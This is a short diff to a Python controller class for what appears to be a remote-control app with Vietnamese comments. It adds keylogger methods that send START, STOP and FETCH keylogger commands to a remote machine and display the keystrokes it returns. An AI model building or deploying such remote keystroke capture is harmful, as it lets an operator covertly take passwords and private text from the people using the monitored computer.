@@ -13,6 +13,7 @@ class cl_controller:
         self.server_port = None
         self.client_ip = None
         self.client_port = 6789
+        self.is_logging = False
     
     def connect_to_server(self, server_ip, server_port):
 
@@ -176,15 +177,35 @@ class cl_controller:
         # Khi dừng chia sẻ màn hình
         server.stop_server()
         self.view.show_message("Đã dừng chia sẻ màn hình.")     
-    
-    # def show_client_config(self):
-    #     client_ip, client_port = self.model.read_config_client()
-    #     if client_ip and client_port:
-    #         config_message = f"Client IP: {client_ip}\nClient Port: {client_port}"
-    #         messagebox.showinfo(title="Thông tin", message=config_message)
-    
-    
-    #-----------------------6. DEL & COPY FILE --------------------------
+
+    #----------5. KEYLOGGER -------------------------------
+    def start_keylogger(self, client_socket):
+        if not self.is_logging:
+            self.is_logging = True
+            self.model.send_command("START_KEYLOGGER")
+            # self.view.show_message("Keylogger started!")
+
+    def stop_keylogger(self):
+        if self.is_logging:
+            self.is_logging = False
+            keys = self.model.send_command("STOP_KEYLOGGER")
+            self.model.add_to_keys_buffer(keys)  # Lưu các phím vào bộ nhớ tạm
+            # self.view.update_entry(" ".join(keys))
+            # self.view.show_message("Keylogger stopped and keys fetched.")
+
+    def print_keylogger(self):
+        keys = self.model.send_command("FETCH_KEYLOGGER")
+        self.model.add_to_keys_buffer(keys)  # Thêm phím vào bộ nhớ tạm
+        existing_text = self.view.get_entry_text()
+        self.view.update_entry(existing_text + " " + " ".join(keys))
+        # self.view.show_message("Keys appended to the entry.")
+
+    def clear_entry(self):
+        self.view.update_entry("")
+        self.model.clear_keys_buffer()
+        # self.view.show_message("Entry cleared.")
+        
+    #----------6. DEL & COPY FILE --------------------------
     def get_files_from_server(self, client_socket, file_path, destination_path): 
         # Tạo tên file dựa trên đường dẫn từ server
         filename = os.path.basename(file_path)
